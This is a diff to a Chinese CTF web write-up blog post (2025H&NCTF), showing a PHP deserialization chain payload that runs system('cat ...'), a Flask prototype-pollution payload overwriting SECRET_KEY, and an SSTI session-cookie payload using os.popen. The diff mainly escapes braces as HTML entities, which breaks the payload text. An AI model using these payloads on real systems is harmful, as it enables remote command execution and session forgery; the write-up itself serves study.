@@ -1,4 +1,5 @@
 ---
+
 title: 2025H&NCTF web
 date: 2025-06-09 23:32:24
 updated: 2025-09-02 21:31:37
@@ -6,9 +7,9 @@ author: Xebdria
 categories:
   - wp
   - 比赛
+
 ---
 
-{% raw %}
 ## ez_php
 
 ```php
@@ -93,13 +94,13 @@ $b->dao=[$c,"cat /ofl1111111111ove4g"];
 $c->HongCaFei="system";
 $arr = array($a,0);
 echo serialize($arr);
-#a:2:{i:0;O:6:"GOGOGO":1:{s:8:"dengchao";O:6:"DouBao":3:{s:3:"dao";a:2:{i:0;O:8:"HeiCaFei":1:{s:9:"HongCaFei";s:6:"system";}i:1;s:23:"cat /ofl1111111111ove4g";}s:9:"Dagongren";a:1:{i:0;i:1;}s:9:"Bagongren";a:1:{i:0;i:2;}}}i:1;i:0;}
+#a:2:{i:0;O:6:"GOGOGO":1:{s:8:"dengchao";O:6:"DouBao":3:{s:3:"dao";a:2:{i:0;O:8:"HeiCaFei":1:{s:9:"HongCaFei";s:6:"system";}i:1;s:23:"cat /ofl1111111111ove4g";}s:9:"Dagongren";a:1:{i:0;i:1;}s:9:"Bagongren";a:1:{i:0;i:2;&#125;&#125;}i:1;i:0;}
 ```
 
 我们把结果最后面的i:1;i:0;改为i:0;i:0;
 
 ```
-data=a:2:{i:0;O:6:"GOGOGO":1:{s:8:"dengchao";O:6:"DouBao":3:{s:3:"dao";a:2:{i:0;O:8:"HeiCaFei":1:{s:9:"HongCaFei";s:6:"system";}i:1;s:23:"cat /ofl1111111111ove4g";}s:9:"Dagongren";a:1:{i:0;i:1;}s:9:"Bagongren";a:1:{i:0;i:2;}}}i:0;i:0;}
+data=a:2:{i:0;O:6:"GOGOGO":1:{s:8:"dengchao";O:6:"DouBao":3:{s:3:"dao";a:2:{i:0;O:8:"HeiCaFei":1:{s:9:"HongCaFei";s:6:"system";}i:1;s:23:"cat /ofl1111111111ove4g";}s:9:"Dagongren";a:1:{i:0;i:1;}s:9:"Bagongren";a:1:{i:0;i:2;&#125;&#125;}i:0;i:0;}
 ```
 
 ## DeceptiFlag
@@ -598,7 +599,7 @@ def admin():
 name和permission，但是我们不知道它的key要怎么伪造呢，我们又想到了原型链污染，我们可以把这个随机的key污染成一个我们想要的key，SECRET_KEY 一般存储在 Flask 应用对象的 `config` 属性，那我们就可以写了
 
 ```
-{"__globals__" : {"app" : {"config" : {"SECRET_KEY":"111"}}}}
+{"__globals__" : {"app" : {"config" : {"SECRET_KEY":"111"&#125;&#125;&#125;&#125;
 污染了后就是ssti了
 
 from flask.sessions import SecureCookieSessionInterface
@@ -613,7 +614,7 @@ class MockApp:
 
 session_data = {
     "name": "admin",
-    "permission": '{{self.__init__.__globals__.__builtins__["__import__"]("os").popen("cat 4flloog").read()}}'
+    "permission": '&#123;&#123;self.__init__.__globals__.__builtins__["__import__"]("os").popen("cat 4flloog").read()&#125;&#125;'
 }
 
 serializer = SecureCookieSessionInterface().get_signing_serializer(MockApp())
@@ -626,4 +627,3 @@ print(cookie_value)
 ## 小结
 
 还没写完....
-{% endraw %}
